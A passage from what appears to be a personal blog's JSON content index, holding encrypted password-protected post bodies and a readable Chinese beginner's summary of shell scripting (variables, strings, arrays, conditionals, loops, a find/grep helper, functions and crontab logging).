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","tags":[{"name":"re","slug":"re","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"}]},{"title":"shellscript总结","date":"2018-04-17T10:33:40.000Z","path":"2018/04/17/shellscript/shellscript/","text":"shellscript总结变量name=&quot;zhang&quot; 变量名和等号之间不能有空格 英文，数字下划线，不能有空格，标点 不能以数字开头 不能是关键字 单引号/双引号 单引号会原样输出 双引号里面可以有变量，转义字符 字符串# 拼接 name=&#39;zhang&#39; helloname=&quot;hello, &quot;$name&quot;!&quot; helloname=&quot;hello, &quot;${name}&quot;!&quot; #获取长度 echo ${#name} # [out]:5 #提取子字符串 echo ${name:1:4} #[out]:hang 数组 my_array=(A B C D) echo &quot;数组的元素为: ${my_array[1]}&quot; echo &quot;数组的元素为: ${my_array[@]}&quot; #[out]: #数组的元素为: B #数组的元素为: A B C D 文件#文件存在且为目录 -d #文件存在且为一般文件 -f #文件存在且为链接文件 -L ifa=10 b=20 if [ $a == $b ];then echo &quot;a 等于 b&quot; elif [ $a -gt $b ];then echo &quot;a 大于 b&quot; elif [ $a -lt $b ];then echo &quot;a 小于 b&quot; else echo &quot;没有符合的条件&quot; fi # [out]:a 等于 b for# for in for loop in 1 2 3 4 5;do echo &quot;The value is: $loop&quot; done # [out]:The value is: 1 The value is: 2 The value is: 3 The value is: 4 The value is: 5 xfindfunction xfind(){ find $1 -type f -regex &quot;.*&quot; -print0 | xargs -0 grep -i $2 } if [ -z &quot;$1&quot; -o -z &quot;$2&quot; ]; then echo &quot;[usage] xfind path_of_dir key_words_you_want_to_search&quot; else xfind $1 $2 fi xargs管道是标准输出到标准输入，但并不是所有命令都是从标准输入中取参数，所以需要xargs命令。使其从标准输出到命令参数 更多细节点这里 function函数返回值只能输0-255数字，且用$?接收 function test(){ read num return $num } test if [ $? -eq 1 ];then echo &quot;yes&quot; else echo &quot;no&quot; fi crontabhttp://wangchujiang.com/linux-command/c/crontab.html 默认日志路径:/var/mail/Username 修改邮件接收地址：MAILTO=939xxxx983@qq.com 日志重定向：* * * * * command &gt;&gt; /Users/Samuel/Desktop/command.log 2&gt;&amp;1","tags":[{"name":"shell","slug":"shell","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/shell/"}]},{"title":"正则表达式","date":"2018-04-08T08:32:33.000Z","path":"2018/04/08/正则表达式/正则表达式/","text":"Need password to decrypt! Incorrect Password! No content to display! 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